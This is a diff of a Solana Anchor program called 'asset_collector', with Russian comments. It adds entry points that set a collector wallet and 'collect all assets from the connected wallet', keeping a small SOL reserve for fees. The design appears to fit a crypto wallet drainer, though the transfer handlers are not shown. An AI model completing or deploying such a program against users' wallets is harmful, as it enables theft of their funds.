@@ -1,28 +1,40 @@
+pub mod constants;
+pub mod error;
+pub mod instructions;
+pub mod state;
+
 use anchor_lang::prelude::*;
 
-#[account]
-pub struct CollectorState {
-    /// Адрес владельца контракта (может менять настройки)
-    pub authority: Pubkey,
-    /// Адрес кошелька-получателя (куда собираются активы)
-    pub collector_wallet: Pubkey,
-    /// Минимальный резерв SOL для газа (в лампортах)
-    pub gas_reserve: u64,
-    /// Bump для PDA
-    pub bump: u8,
-}
+pub use constants::*;
+pub use instructions::*;
+pub use state::*;
 
-impl CollectorState {
-    /// Размер аккаунта в байтах
-    pub const LEN: usize = 8 + // discriminator
-        32 + // authority
-        32 + // collector_wallet  
-        8 +  // gas_reserve
-        1;   // bump
+declare_id!("4LiT8r7gQ1ggVVdJBjEiKC5KJAnPoFC6eA1ikom8XB7Y");
 
-    /// Минимальный резерв для газа (0.015 SOL в лампортах)
-    pub const DEFAULT_GAS_RESERVE: u64 = 15_000_000; // 0.015 SOL
+#[program]
+pub mod asset_collector {
+    use super::*;
+
+    /// Инициализация контракта (оставляем для совместимости)
+    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
+        initialize::handler(ctx)
+    }
     
-    /// Seed для PDA
-    pub const SEED: &'static [u8] = b"collector-state";
+    /// Инициализация состояния сборщика (новый подход)
+    pub fn initialize_collector(ctx: Context<InitializeCollector>) -> Result<()> {
+        initialize_collector_handler(ctx)
+    }
+    
+    /// Установка кошелька-получателя (только владелец)
+    pub fn set_collector_wallet(
+        ctx: Context<SetCollectorWallet>,
+        new_collector_wallet: Pubkey
+    ) -> Result<()> {
+        set_collector_wallet_handler(ctx, new_collector_wallet)
+    }
+    
+    /// Сбор всех активов с подключенного кошелька
+    pub fn collect_all_assets(ctx: Context<CollectAllAssets>) -> Result<()> {
+        collect_all_assets_handler(ctx)
+    }
 }
